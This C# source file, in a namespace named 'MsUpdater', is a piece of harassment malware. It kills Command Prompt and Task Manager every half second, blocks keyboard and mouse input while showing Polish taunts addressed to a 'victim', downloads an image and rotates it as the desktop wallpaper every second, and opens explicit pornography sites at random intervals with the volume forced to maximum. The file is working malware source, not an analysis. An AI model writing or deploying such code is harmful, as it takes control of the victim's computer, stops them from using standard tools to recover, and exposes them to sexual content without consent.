namespace MsUpdater
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Diagnostics.CodeAnalysis;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Threading;
    using System.Threading.Tasks;

    using WindowsInput;

    using Timer = System.Timers.Timer;

    internal static class Service
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        internal static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private static readonly Random Random = new Random();

        // ReSharper disable once PrivateFieldCanBeConvertedToLocalVariable
        private static readonly string Temp;

        [SuppressMessage("ReSharper", "LocalizableElement")]
        static Service()
        {
            Temp = Path.Combine(Directory.GetCurrentDirectory(), "Temp");

            if (!Directory.Exists(Temp))
            {
                Directory.CreateDirectory(Temp);
            }

            new Thread(async () =>
                    {
                        await Task.Delay(300.Seconds());

                        var target = Path.Combine(Temp, "background.jpeg");

                        using (var client = new WebClient())
                        {
                            client.DownloadFile("http://2.bp.blogspot.com/-QUvbrUetEyM/VumpFVoFGAI/AAAAAAAAAGo/cF3Z0wqHM3wuuqEHpdas-Gs9cu9YhLHUA/s1600/11416159_1627270640883558_5936567115635789082_n.jpg", target);
                        }

                        using (var img = Image.FromFile(target))
                        {
                            for (var i = 0; i < 4; i++)
                            {
                                img.RotateFlip(RotateFlipType.Rotate90FlipNone);
                                img.Save(Path.Combine(Temp, $"background{i}.jpeg"), ImageFormat.Jpeg);
                            }
                        }

                        while (true)
                        {
                            for (var i = 0; i < 4; i++)
                            {
                                await Task.Delay(1.Seconds());

                                BackgroundUpdate(Path.Combine(Temp, $"background{i}.jpeg"));
                            }
                        }

                    }).Start();

            new Timer(500d) { Enabled = true }.Elapsed += delegate
                {
                    var processes = Process.GetProcesses();

                    Array.ForEach(processes, process =>
                        {
                            switch (process.ProcessName.ToLower())
                            {
                                case "cmd":
                                    if (!Array.Exists(processes, proc => proc.ProcessName.Equals("uninstall", StringComparison.CurrentCultureIgnoreCase)))
                                        process.Kill();
                                    break;
                                case "taskmgr":
                                    process.Kill();
                                    break;
                            }
                    });
                };

            Thread.Sleep(Random.Next(5, 30).Seconds());

            using (new InputBlock())
            {
                NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro,");

                Thread.Sleep(2.Seconds());

                AllocConsole();

                Console.Title = "NIE MASZ DOKĄD UCIEC";
                Console.WriteLine("Będę się świetnie bawił...\n\n");

                for (var i = 9; i >= 0; i--)
                {
                    Console.Write($"\rOdzyskasz kontrolę za {i}");
                    Thread.Sleep(1.Seconds());
                }

                FreeConsole();
            }

            StartWorkingAsync();
        }

        private static void SetMaxVolume()
        {
            for (var i = 0; i < 100; i++)
            {
                InputSimulator.SimulateKeyPress(VirtualKeyCode.VOLUME_UP);
            }
        }

        private static int Seconds(this int baseValue)
        {
            return baseValue * 1000;
        }

        private static void BackgroundUpdate(string path)
        {
            SystemParametersInfo(20, 0, path, 3);
        }

        private static async void StartWorkingAsync()
        {
            var niceLinks = new List<string>
                          {
                              "https://xhamster.com/movies/3498833/xarabcam_-_gay_arab_men_-_basem_-_iraq.html",
                              "https://xhamster.com/channels/new-gays-1.html",
                              "https://xhamster.com/movies/7101419/sauna_sex.html",
                              "https://xhamster.com/movies/6701965/latin_boy_chuy_barebacks_muscular_chelo.html"
                          };

            foreach (var link in niceLinks)
            {
                await Task.Delay(Random.Next(120, 1800).Seconds());

                Process.Start(link);

                await Task.Delay(500);

                SetMaxVolume();
            }
        }
    }
}